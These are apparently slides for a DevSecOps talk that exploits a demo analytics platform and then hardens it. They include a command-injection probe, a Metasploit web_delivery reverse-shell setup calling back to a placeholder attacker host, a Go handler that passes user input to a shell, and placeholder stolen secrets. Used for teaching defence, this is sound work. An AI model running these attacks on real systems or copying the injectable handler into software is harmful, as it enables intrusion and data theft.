# DevSecOps Presentation Slides
## From Pen Test to Production

---

## Slide 1: Title Slide

```
FROM PEN TEST TO PRODUCTION
A DevSecOps Journey

Tristan Tremblay
Infrastructure Developer
Canadian Centre for Computational Genomics (C3G)
McGill University

[Your Logo/McGill Logo]
```

---

## Slide 2: About Me

```
MY BACKGROUND

Education & Training
• B.Sc. Cybersecurity - Polytechnique Montréal (2020-2023)
• CR 470: Penetration Testing
  - Full kill chain methodology
  - Metasploit, Nmap, password attacks, post-exploitation

Professional Experience
• Security Technician - Laporte Expert Conseils (2021-2022)
  - Vulnerability assessments, penetration testing
• DevOps Developer - Microsoft Nuance (2022)
• Cloud Administrator - CGI (2023-2024)
  - AWS, Azure, GCP infrastructure
  - CrowdStrike Falcon deployment
• Co-Founder & AI Developer - InnovAI (2023-2024)
```

---

## Slide 3: The Question

```
WHAT'S THE DIFFERENCE?

Building infrastructure with security knowledge
              vs.
Building infrastructure then adding security

Today's demo: I'll show you the difference
```

---

## Slide 4: The DevSecOps Loop

```
           ┌──────────┐
           │   PLAN   │
           └────┬─────┘
                │
           ┌────▼─────┐
           │   CODE   │
           └────┬─────┘
                │
           ┌────▼─────┐
           │  BUILD   │
           └────┬─────┘
                │
           ┌────▼─────┐
           │   TEST   │
           └────┬─────┘
                │
           ┌────▼─────┐
           │ RELEASE  │
           └────┬─────┘
                │
           ┌────▼─────┐
           │  DEPLOY  │
           └────┬─────┘
                │
           ┌────▼─────┐
           │ OPERATE  │
           └────┬─────┘
                │
           ┌────▼─────┐
           │ MONITOR  │
           └──────────┘

Security at EVERY stage, not just the end
```

---

## Slide 5: Interactive - Tool Placement

```
WHERE DO THESE TOOLS BELONG?

Tools to Place:
• GitHub
• Docker
• Terraform
• Snyk
• SonarQube
• OWASP ZAP
• HashiCorp Vault
• Prometheus

[Interactive: Ask audience to place each tool in the DevSecOps loop]
```

---

## Slide 6: Today's Demo

```
THE CHALLENGE: IntelliMetrics

What I Built:
• AI-powered analytics platform
• Astro + TypeScript frontend
• Golang REST API
• MongoDB database
• Deployed with Docker

What I'll Show:
1. Red Team: Exploit my own platform
2. Blue Team: Stop those attacks with DevSecOps
```

---

## Slide 7: The Scenario

```
INTELLIMETRICS - AI ANALYTICS PLATFORM

Features:
• Real-time business analytics
• AI-powered insights (GPT-4)
• Multi-tenant SaaS
• 100+ companies onboarded

Stack:
• Frontend: Astro + shadcn/ui
• Backend: Golang (Gin framework)
• Database: MongoDB
• AI: OpenAI API integration

Status: Shipped fast, moved to production quickly ⚡
```

---

## Slide 8: The Attack - Phase 1

```
PHASE 1: RECONNAISSANCE

Methodology: Passive & Active Information Gathering

Tools:
• Nmap - Port scanning
• dig - DNS enumeration
• Sublist3r - Subdomain discovery

Findings:
┌──────────────┬─────────────────────┐
│ Port         │ Service             │
├──────────────┼─────────────────────┤
│ 443/tcp      │ HTTPS (Nginx)       │
│ 8080/tcp     │ Golang API          │
│ 27017/tcp    │ MongoDB (EXPOSED!)  │
└──────────────┴─────────────────────┘

⚠️ MongoDB should never be public
```

---

## Slide 9: The Attack - Phase 2

```
PHASE 2: ENUMERATION

Web Application Endpoint Discovery

Found Endpoints:
✓ /api/admin/system     [200] ⚠️
✓ /api/admin/debug      [200] ⚠️
✓ /api/admin/config     [200] ⚠️
✓ /api/query            [200]

Testing /api/admin/system:
$ curl "https://demo.site/api/admin/system?cmd=whoami"
>>> app

Command Injection Confirmed ✓
```

---

## Slide 10: The Attack - Phase 3

```
PHASE 3: EXPLOITATION

Weaponizing the Vulnerability

Metasploit Setup:
┌─────────────────────────────────────┐
│ use exploit/multi/script/web_delivery│
│ set target 7                        │
│ set payload python/meterpreter/     │
│         reverse_tcp                 │
│ set LHOST [attacker_ip]            │
│ set LPORT 4444                     │
│ exploit -j                         │
└─────────────────────────────────────┘

Payload Delivery:
Inject via command injection endpoint

Result:
[*] Meterpreter session 1 opened ✓
```

---

## Slide 11: The Attack - Phase 4

```
PHASE 4: POST-EXPLOITATION

What an attacker does after gaining access:

1. Credential Harvesting
   └─> Found .env file with ALL secrets

2. Database Access
   └─> MongoDB: 2.4GB customer data

3. Network Enumeration
   └─> Mapped internal services

4. Lateral Movement
   └─> Access to Redis, PostgreSQL

5. Persistence
   └─> Backdoor installed

Time to Compromise: 15 minutes
```

---

## Slide 12: Stolen Secrets

```
CREDENTIALS EXPOSED IN .env FILE

MONGODB_URI=mongodb://admin:P@ssw0rd123!@db:27017
OPENAI_API_KEY=sk-proj-abc123def456...
JWT_SECRET=weak_secret_key_dont_use
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG...
STRIPE_SECRET_KEY=sk_live_51234567890...
ADMIN_EMAIL=admin@intellimetrics.dev
ADMIN_PASSWORD=Admin123!

Every secret. Every credential. In plaintext.
```

---

## Slide 13: Impact Assessment

```
ATTACK SUMMARY

Time Elapsed: 15 minutes

What Was Compromised:
✓ Remote code execution
✓ All API keys and secrets
✓ 2.4GB customer database
✓ 100+ companies' business data
✓ Internal network access
✓ Persistent backdoor installed

Business Impact:
• Complete platform compromise
• Potential $50,000+ in stolen API usage
• Customer data breach (GDPR violations)
• Reputational damage
• Business extinction-level event
```

---

## Slide 14: The Secure Version

```
DEPLOYING THE SECURE VERSION

Triggering CI/CD Pipeline:
$ git checkout secure
$ git push origin secure

Pipeline Stages:
┌────────────────────────────────────┐
│ ✓ SAST (Gosec)                    │
│ ✓ Dependency Check (Nancy)        │
│ ✓ Secret Scanning (Gitleaks)      │
│ ✓ Container Security (Trivy)      │
│ ✓ IaC Security (tfsec)            │
│ ✓ Deploy to Staging               │
│ ✓ DAST (OWASP ZAP)                │
│ ✓ Security Validation Tests       │
│ ✓ Deploy to Production            │
└────────────────────────────────────┘

All checks passed ✓
```

---

## Slide 15: Security Fixes - Code

```
CODE COMPARISON

BEFORE (Vulnerable):
┌──────────────────────────────────────┐
│ router.GET("/api/admin/system",     │
│   func(c *gin.Context) {            │
│     cmd := c.Query("cmd")           │
│     exec.Command("sh", "-c", cmd)   │
│   })                                 │
└──────────────────────────────────────┘

AFTER (Secure):
┌──────────────────────────────────────┐
│ // Endpoint removed entirely         │
│ // Admin functions use authenticated │
│ // API calls with strict validation  │
│ // NO shell commands from user input │
└──────────────────────────────────────┘
```

---

## Slide 16: Security Fixes - Secrets

```
SECRETS MANAGEMENT

BEFORE:
const OPENAI_KEY = "sk-proj-abc123..."

AFTER:
┌──────────────────────────────────────┐
│ import vault "hashicorp/vault/api"  │
│                                      │
│ func getSecret(key string) string { │
│   client := vault.NewClient(...)    │
│   secret := client.Logical().Read(  │
│     "secret/data/" + key)           │
│   return secret.Data["value"]       │
│ }                                    │
└──────────────────────────────────────┘

✓ Encrypted at rest
✓ Rotated automatically
✓ Audit logging enabled
```

---

## Slide 17: Security Fixes - Network

```
NETWORK ISOLATION

BEFORE:
┌─────────────────────────────────┐
│ MongoDB exposed on port 27017   │
│ ├─> Accessible from internet    │
│ └─> No authentication required  │
└─────────────────────────────────┘

AFTER:
┌─────────────────────────────────┐
│ networks:                       │
│   backend:                      │
│     driver: bridge              │
│     internal: true              │
│                                 │
│ mongo:                          │
│   networks:                     │
│     - backend                   │
│   # NO ports exposed to host    │
└─────────────────────────────────┘

✓ Private Docker network
✓ Not accessible externally
✓ Authentication required
```

---

## Slide 18: Testing the Secure Version

```
ATTEMPTING THE SAME ATTACKS

Attack 1: Port Scan
$ nmap -p 27017 demo-secure.site
>>> 27017/tcp filtered

Attack 2: Command Injection
$ curl "/api/admin/system?cmd=whoami"
>>> 404 Not Found

Attack 3: Metasploit
msf > exploit
>>> [*] Connection refused
>>> [*] Exploit failed

Result: All attacks blocked ✓
```

---

## Slide 19: Defense in Depth

```
SECURITY LAYERS

┌─────────────────────────────────────┐
│  WAF - Rate Limiting & Filtering    │
│  ✓ Blocks injection patterns        │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│  Application - Input Validation     │
│  ✓ Strict type checking             │
│  ✓ Authentication required          │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│  Network - Segmentation             │
│  ✓ Private networks                 │
│  ✓ Firewall rules                   │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│  Database - Hardened                │
│  ✓ TLS encryption                   │
│  ✓ Authentication required          │
└─────────────────────────────────────┘

Multiple layers of protection
```

---

## Slide 20: Monitoring & Detection

```
REAL-TIME SECURITY MONITORING

Security Alerts (Last Hour):

[14:23:41] 🚨 BLOCKED: Command injection
  Source: 203.0.113.45
  Pattern: "whoami"
  Action: Blocked, IP rate-limited

[14:24:15] 🚨 BLOCKED: Port scan detected
  Source: 203.0.113.45
  Ports: 27017, 8080, 3306
  Action: IP blacklisted for 24h

[14:24:52] 🚨 BLOCKED: Metasploit detected
  Source: 203.0.113.45
  Pattern: python/urllib
  Action: Connection refused

Every attack logged and blocked in real-time
```

---

## Slide 21: Side-by-Side Comparison

```
VULNERABLE vs SECURE

┌─────────────────────┬─────────────────────┐
│ VULNERABLE          │ SECURE              │
├─────────────────────┼─────────────────────┤
│ ❌ Command injection│ ✅ Removed entirely │
│ ❌ Exposed MongoDB  │ ✅ Network isolated │
│ ❌ Hardcoded secrets│ ✅ Vault integration│
│ ❌ No authentication│ ✅ Required on all  │
│ ❌ No validation    │ ✅